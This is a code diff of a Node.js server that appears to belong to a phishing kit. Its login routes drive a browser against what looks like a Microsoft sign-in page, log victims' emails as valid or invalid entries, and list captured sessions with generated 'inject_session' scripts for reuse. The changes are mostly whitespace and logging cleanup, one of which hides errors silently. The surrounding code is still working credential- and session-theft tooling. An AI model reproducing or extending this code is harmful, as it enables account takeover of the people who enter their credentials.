@@ -546,7 +546,7 @@ app.post('/api/login', async (req, res) => {
             if (!loginSuccess) {
                 analytics.invalidEntries++;
                 saveAnalytics();
-                
+
                 // Get more specific error details
                 let errorDetails = 'Password authentication failed';
                 try {
@@ -554,7 +554,7 @@ app.post('/api/login', async (req, res) => {
                     if (currentUrl.includes('error')) {
                         errorDetails += ' - Authentication error detected in URL';
                     }
-                    
+
                     // Check for specific error messages on the page
                     const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
                     if (errorElements.length > 0) {
@@ -573,7 +573,7 @@ app.post('/api/login', async (req, res) => {
                 } catch (e) {
                     console.log('Could not extract additional error details:', e.message);
                 }
-                
+
                 saveInvalidEntry(sessionId, email, 'Login Failed', errorDetails);
                 console.log(`📊 Invalid entry saved for ${email}: ${errorDetails}`);
             }
@@ -904,12 +904,12 @@ app.post('/api/continue-login', async (req, res) => {
                 responseMessage = 'Login may require additional verification';
                 analytics.invalidEntries++;
                 saveAnalytics();
-                
+
                 // Save invalid entry for failed continue-login
                 const email = session.email || 'unknown@unknown.com';
                 const currentUrl = session.automation.page.url();
                 let errorDetails = `Login verification failed. Current URL: ${currentUrl}`;
-                
+
                 // Try to get specific error message
                 try {
                     const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
@@ -925,11 +925,10 @@ app.post('/api/continue-login', async (req, res) => {
                         }
                     }
                 } catch (e) {
-                    console.log('Could not extract error details for continue-login failure');
+                    // Silent fail for error extraction
                 }
-                
+
                 saveInvalidEntry(requestedSessionId, email, 'Continue Login Failed', errorDetails);
-                console.log(`📊 Invalid continue-login entry saved for ${email}`);
             }
 
             res.json({
@@ -1460,20 +1459,20 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
         }
 
         const files = fs.readdirSync(sessionDir);
-        
+
         // Get valid sessions
         const validSessionFiles = files.filter(file => file.startsWith('session_') && file.endsWith('.json'));
         const validSessions = validSessionFiles.map(file => {
             try {
                 const filePath = path.join(sessionDir, file);
                 const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
-                
+
                 // Generate injection script filename
                 const sessionId = data.id;
                 const injectFilename = `inject_session_${sessionId}.js`;
                 const injectPath = path.join(sessionDir, injectFilename);
                 const hasInjectScript = fs.existsSync(injectPath);
-                
+
                 return {
                     filename: file,
                     injectFilename: hasInjectScript ? injectFilename : null,
@@ -1496,7 +1495,7 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
             try {
                 const filePath = path.join(sessionDir, file);
                 const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
-                
+
                 return {
                     filename: file,
                     injectFilename: null, // Invalid entries don't have inject scripts
